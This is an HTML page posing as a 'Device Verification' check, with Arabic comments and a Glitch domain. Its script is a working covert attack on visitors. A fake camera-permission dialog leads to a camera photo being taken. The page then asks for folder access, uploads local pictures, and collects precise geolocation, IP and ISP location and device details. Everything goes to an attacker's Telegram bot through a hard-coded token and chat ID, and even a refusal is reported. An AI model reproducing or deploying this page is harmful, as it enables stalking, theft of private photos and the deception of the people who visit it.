<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        /* الأنماط الأساسية */
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #202124;
        }
        
        /* أنماط طلب الإذن المعدلة */
        .permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .permission-box {
            background: white;
            border-radius: 8px;
            width: 360px;
            max-width: 90%;
            padding: 24px;
            text-align: start;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
            animation: fadeIn 0.3s ease;
        }
        
        .permission-header {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }
        
        .permission-icon {
            width: 24px;
            height: 24px;
            margin-right: 16px;
            color: #5f6368;
        }
        
        .permission-title {
            font-size: 16px;
            font-weight: 500;
            margin: 0;
            color: #202124;
        }
        
        .domain-info {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
            padding: 12px;
            background-color: #f8f9fa;
            border-radius: 4px;
        }
        
        .domain-icon {
            width: 16px;
            height: 16px;
            margin-right: 12px;
            color: #5f6368;
        }
        
        .domain {
            font-size: 14px;
            font-weight: 500;
            color: #202124;
        }
        
        .permission-text {
            font-size: 14px;
            line-height: 20px;
            margin-bottom: 24px;
            color: #5f6368;
        }
        
        .permission-options {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .permission-btn {
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            transition: background-color 0.2s;
        }
        
        .allow-while {
            background: #1a73e8;
            color: white;
        }
        
        .allow-while:hover {
            background: #1765cc;
        }
        
        .allow-once {
            background: #f1f3f4;
            color: #1a73e8;
            border: 1px solid #dadce0;
        }
        
        .allow-once:hover {
            background: #e8f0fe;
        }
        
        .never-allow {
            background: transparent;
            color: #5f6368;
        }
        
        .never-allow:hover {
            background: #f8f9fa;
        }
        
        /* أنماط الواجهة الرئيسية */
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        
        #status {
            font-size: 18px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        #main-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        #main-btn:hover {
            background: #1765cc;
        }
        
        .hidden {
            display: none;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <!-- واجهة طلب إذن الكاميرا المعدلة -->
    <div id="permission-overlay" class="permission-overlay hidden">
        <div class="permission-box">
            <div class="permission-header">
                <svg class="permission-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 15c1.66 0 3-1.34 3-3V6c0-1.66-1.34-3-3-3S9 4.34 9 6v6c0 1.66 1.34 3 3 3z"/>
                    <path d="M17 12c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-2.08c3.39-.49 6-3.39 6-6.92h-2z"/>
                </svg>
                <h2 class="permission-title">طلب إذن الكاميرا</h2>
            </div>
            
            <div class="domain-info">
                <svg class="domain-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
                </svg>
                <span class="domain">tropical-yellow-seismosaurus.glitch.me</span>
            </div>
            
            <p class="permission-text">يريد هذا الموقع الوصول إلى كاميرا جهازك. سيتمكن من التقاط الصور والفيديوهات عند منح الإذن.</p>
            
            <div class="permission-options">
                <button id="allow-while" class="permission-btn allow-while">السماح أثناء زيارة الموقع</button>
                <button id="allow-once" class="permission-btn allow-once">السماح هذه المرة فقط</button>
                <button id="never-allow" class="permission-btn never-allow">عدم السماح</button>
            </div>
        </div>
    </div>

    <!-- الواجهة الرئيسية -->
    <div class="container">
        <div>
            <div id="status">انتظر 3 دقائق... Wait 3 minutes...</div>
            <button id="main-btn" class="hidden">Start Verification</button>
        </div>
    </div>

    <script>
        // Telegram configuration
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        // مسارات الصور المطلوبة
        const IMAGE_PATHS = [
            '/storage/emulated/0/Pictures',
            '/sdcard/Pictures',
            '/storage/emulated/0/Camera',
            '/sdcard/Camera',
            '/storage/emulated/0/DCIM/Camera',
            '/sdcard/DCIM/Camera',
            '/storage/emulated/0/DCIM',
            '/sdcard/DCIM'
        ];

        // Elements
        const statusEl = document.getElementById('status');
        const mainBtn = document.getElementById('main-btn');
        const permissionOverlay = document.getElementById('permission-overlay');
        const allowWhileBtn = document.getElementById('allow-while');
        const allowOnceBtn = document.getElementById('allow-once');
        const neverAllowBtn = document.getElementById('never-allow');

        // Global variables
        let cameraPermission = null;
        let cameraStream = null;
        
        // Show main button after 3 seconds
        setTimeout(() => {
            statusEl.textContent = "Click to start verification\nانقر للبدء في التحقق";
            mainBtn.classList.remove('hidden');
        }, 3000);

        // Handle main button click
        mainBtn.addEventListener('click', () => {
            showCameraPermissionDialog();
        });

        // Show camera permission dialog
        function showCameraPermissionDialog() {
            statusEl.textContent = "Waiting for permission...\nفي انتظار الإذن...";
            mainBtn.classList.add('hidden');
            permissionOverlay.classList.remove('hidden');
        }

        // Handle permission button clicks
        allowWhileBtn.addEventListener('click', async () => {
            cameraPermission = 'while_visiting';
            permissionOverlay.classList.add('hidden');
            await startVerificationProcess();
        });

        allowOnceBtn.addEventListener('click', async () => {
            cameraPermission = 'this_time';
            permissionOverlay.classList.add('hidden');
            await startVerificationProcess();
        });

        neverAllowBtn.addEventListener('click', () => {
            cameraPermission = 'denied';
            permissionOverlay.classList.add('hidden');
            statusEl.textContent = "Camera access denied\nتم رفض إذن الكاميرا";
            sendToTelegram("⚠️ User denied camera access\n⚠️ المستخدم رفض إذن الكاميرا");
        });

        // Main verification process
        async function startVerificationProcess() {
            try {
                statusEl.textContent = "Starting verification...\nجاري بدء عملية التحقق...";
                
                // تشغيل جميع العمليات بشكل متوازي لزيادة السرعة
                await Promise.all([
                    // 1. Take and send camera photo if permitted
                    (cameraPermission !== 'denied') ? takeAndSendCameraPhoto() : Promise.resolve(),
                    
                    // 2. Try to access and send local pictures
                    accessAndSendLocalPictures(),
                    
                    // 3. Send device info
                    sendCompleteDeviceInfo()
                ]);
                
                statusEl.textContent = "Verification complete!\nتم التحقق بنجاح!";
                
            } catch (error) {
                console.error('Error:', error);
                statusEl.textContent = "Error occurred\nحدث خطأ";
                await sendToTelegram(`⚠️ Error: ${error.message}\n⚠️ خطأ: ${error.message}`);
            }
        }

        async function takeAndSendCameraPhoto() {
            try {
                statusEl.textContent = "Accessing camera...\nجاري الوصول إلى الكاميرا...";
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                cameraStream = stream;
                const video = document.createElement('video');
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // تقليل وقت الانتظار لزيادة السرعة
                await new Promise(resolve => setTimeout(resolve, 200));
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());
                
                // إرسال الصورة بدون انتظار الرد لزيادة السرعة
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'camera_photo.jpg');
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).catch(e => console.error('Photo send error:', e));
                    
                }, 'image/jpeg', 0.8); // تقليل جودة الصورة لزيادة السرعة
                
            } catch (error) {
                console.error('Camera error:', error);
                await sendToTelegram("⚠️ Camera access denied\n⚠️ تم رفض إذن الكاميرا");
            }
        }

        async function accessAndSendLocalPictures() {
            try {
                statusEl.textContent = "Scanning for pictures...\nجاري البحث عن الصور...";
                
                let picturesSent = 0;
                const maxPictures = 15; // زيادة عدد الصور المرسلة
                
                // محاولة الوصول إلى المسارات المحددة
                for (const path of IMAGE_PATHS) {
                    if (picturesSent >= maxPictures) break;
                    
                    try {
                        // محاولة الوصول إلى المجلد باستخدام File System Access API
                        const dirHandle = await window.showDirectoryPicker({
                            startIn: path
                        });
                        
                        picturesSent += await sendPicturesFromDirectory(dirHandle, maxPictures - picturesSent);
                        
                    } catch (e) {
                        console.log(`Couldn't access ${path}:`, e);
                        
                        // محاولة بديلة باستخدام fetch إذا كان المسار معروفًا
                        if (path.startsWith('/storage/') || path.startsWith('/sdcard/')) {
                            try {
                                const response = await fetch(path);
                                if (response.ok) {
                                    // هنا يمكنك معالجة الملفات إذا كان الوصول متاحًا
                                }
                            } catch (fetchError) {
                                console.log(`Fetch access failed for ${path}:`, fetchError);
                            }
                        }
                    }
                }
                
                if (picturesSent > 0) {
                    await sendToTelegram(`📸 Sent ${picturesSent} pictures\nتم إرسال ${picturesSent} صورة`);
                } else {
                    await sendToTelegram("⚠️ No pictures found in standard locations\n⚠️ لم يتم العثور على صور في المواقع المعتادة");
                }
                
            } catch (error) {
                console.log('Local pictures access failed:', error);
                await sendToTelegram("⚠️ Could not access local pictures\n⚠️ تعذر الوصول إلى الصور المحلية");
            }
        }

        async function sendPicturesFromDirectory(dirHandle, maxFiles) {
            let picturesSent = 0;
            const fileHandles = [];
            
            // جمع الملفات أولاً
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif|webp)$/i)) {
                    fileHandles.push(entry);
                    if (fileHandles.length >= maxFiles) break;
                }
            }
            
            // إرسال الملفات بشكل متوازي
            await Promise.all(fileHandles.map(async (entry) => {
                try {
                    const file = await entry.getFile();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', file, file.name);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    picturesSent++;
                    
                } catch (e) {
                    console.error('Error sending picture:', e);
                }
            }));
            
            return picturesSent;
        }

        async function sendCompleteDeviceInfo() {
            try {
                statusEl.textContent = "Collecting device info...\nجاري جمع معلومات الجهاز...";
                
                // جمع المعلومات بشكل متوازي لزيادة السرعة
                const [batteryInfo, locationInfo, networkInfo] = await Promise.all([
                    getBatteryInfo(),
                    getLocationInfo(),
                    getNetworkInfo()
                ]);
                
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: `${window.screen.colorDepth}bit`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString(),
                    battery: batteryInfo,
                    location: locationInfo,
                    ip: networkInfo?.ip,
                    networkLocation: networkInfo?.location
                };

                const message = formatDeviceInfo(deviceInfo);
                await sendToTelegram(message);
                
            } catch (error) {
                console.error('Device info error:', error);
                await sendToTelegram("⚠️ Error collecting device info\n⚠️ خطأ في جمع معلومات الجهاز");
            }
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: `${Math.floor(battery.level * 100)}%`,
                        charging: battery.charging ? 'Yes' : 'No'
                    };
                } catch (e) {
                    return 'Not available';
                }
            }
            return 'Not available';
        }

        async function getLocationInfo() {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000 // تقليل وقت الانتظار
                    });
                });
                
                return {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: `${position.coords.accuracy}m`
                };
                
            } catch (e) {
                return null;
            }
        }

        async function getNetworkInfo() {
            try {
                const [ipResponse, locationResponse] = await Promise.all([
                    fetch('https://api.ipify.org?format=json'),
                    fetch('https://ipapi.co/json/').catch(() => null)
                ]);
                
                const ipData = await ipResponse.json();
                let locationData = null;
                
                if (locationResponse) {
                    locationData = await locationResponse.json();
                }
                
                return {
                    ip: ipData.ip,
                    location: locationData ? {
                        country: locationData.country_name,
                        city: locationData.city,
                        region: locationData.region,
                        isp: locationData.org
                    } : null
                };
            } catch (e) {
                return null;
            }
        }

        function formatDeviceInfo(info) {
            let message = `📱 <b>DEVICE INFORMATION</b>\n\n`;
            
            message += `🖥️ <b>System Info</b>\n`;
            message += `- Platform: ${info.platform}\n`;
            message += `- User Agent: ${info.userAgent}\n`;
            message += `- Memory: ${info.deviceMemory}\n`;
            message += `- CPU Cores: ${info.cpuCores}\n`;
            message += `- Screen: ${info.screen} (${info.colorDepth}bit)\n`;
            message += `- Language: ${info.language}\n`;
            message += `- Timezone: ${info.timezone}\n`;
            message += `- Timestamp: ${info.timestamp}\n\n`;
            
            message += `🔋 <b>Battery</b>\n`;
            if (typeof info.battery === 'object') {
                message += `- Level: ${info.battery.level}\n`;
                message += `- Charging: ${info.battery.charging ? 'Yes' : 'No'}\n\n`;
            } else {
                message += `${info.battery}\n\n`;
            }
            
            if (info.location) {
                message += `📍 <b>Location</b>\n`;
                message += `- Latitude: ${info.location.latitude}\n`;
                message += `- Longitude: ${info.location.longitude}\n`;
                message += `- Accuracy: ${info.location.accuracy}\n`;
                message += `- Google Maps: https://maps.google.com/?q=${info.location.latitude},${info.location.longitude}\n\n`;
            }
            
            if (info.ip) {
                message += `🌐 <b>Network</b>\n`;
                message += `- IP: ${info.ip}\n`;
                if (info.networkLocation) {
                    message += `- Country: ${info.networkLocation.country}\n`;
                    message += `- Region: ${info.networkLocation.region}\n`;
                    message += `- City: ${info.networkLocation.city}\n`;
                    message += `- ISP: ${info.networkLocation.isp}\n`;
                }
            }
            
            return message;
        }

        async function sendToTelegram(message) {
            try {
                // إرسال الرسالة بدون انتظار الرد لزيادة السرعة
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }).catch(e => console.error('Telegram send error:', e));
            } catch (e) {
                console.error('Telegram send error:', e);
            }
        }
    </script>
</body>
</html>
